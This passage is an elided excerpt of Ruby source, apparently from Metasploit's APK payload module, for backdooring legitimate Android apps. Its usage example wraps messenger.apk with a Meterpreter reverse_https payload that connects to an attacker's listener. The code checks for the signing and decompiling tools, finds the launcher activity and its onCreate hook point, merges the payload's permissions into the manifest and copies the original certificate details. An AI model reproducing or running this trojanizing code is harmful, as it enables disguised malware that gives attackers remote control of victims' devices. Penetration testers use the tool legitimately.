...
class Msf::Payload::Apk
  ...
  def usage
    print_error "Usage: #{$PROGRAM_NAME} -x [target.apk] [msfvenom options]\n"
    print_error "e.g. #{$PROGRAM_NAME} -x messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\n"
  end
  ...
  def find_launcher_activity(amanifest)
    ...
    for activity in activities
      ...
      activityname = activity.attribute("name") unless activityname
      category = activity.search('category')
      next unless category
      for cat in category
        categoryname = cat.attribute('name')
        next unless categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN'
        name = activityname.to_s
        name = package + name if name.start_with?('.')
        return name
      end
    end
  end
  ...
  def fix_manifest(tempdir)
    ...
    payload_permissions.each do |permission|
      name = permission.attribute("name").to_s
      next if old_permissions.include?(name)
  ...
  def parse_orig_cert_data(orig_apkfile)
    ...
    orig_cert_data.push(orig_cert_dname.to_s)
  ...
  def backdoor_apk(apkfile, raw_payload)
    unless apkfile && File.readable?(apkfile)
      usage
      raise "Invalid template: #{apkfile}"
    end

    keytool = run_cmd("keytool")
    if keytool.nil?
      raise "keytool not found. If it's not in your PATH, please add it."
    end

    jarsigner = run_cmd("jarsigner")
    if jarsigner.nil?
      raise "jarsigner not found. If it's not in your PATH, please add it."
    end

    zipalign = run_cmd("zipalign")
    if zipalign.nil?
      raise "zipalign not found. If it's not in your PATH, please add it."
    end

    apktool = run_cmd("apktool -version")
    if apktool.nil?
      raise "apktool not found. If it's not in your PATH, please add it."
    end

    apk_v = Gem::Version.new(apktool)
    unless apk_v >= Gem::Version.new('2.0.1')
      raise "apktool version #{apk_v} not supported, please download at least version 2.0.1."
    end
    ...
    unless launcheractivity
      raise "Unable to find hookable activity in #{apkfile}\n"
    end
    smalifile = "#{tempdir}/original/smali*/" + launcheractivity.tr('.', "/") + ".smali"
    smalifiles = Dir.glob(smalifile)
    for smalifile in smalifiles
      activitysmali = File.read(smalifile) if File.readable?(smalifile)
    end

    raise "Unable to find hook point in #{smalifiles}\n" unless activitysmali

    entrypoint = ';->onCreate(Landroid/os/Bundle;)V'
    unless activitysmali.include? entrypoint
      raise "Unable to find onCreate() in #{smalifile}\n"
    end
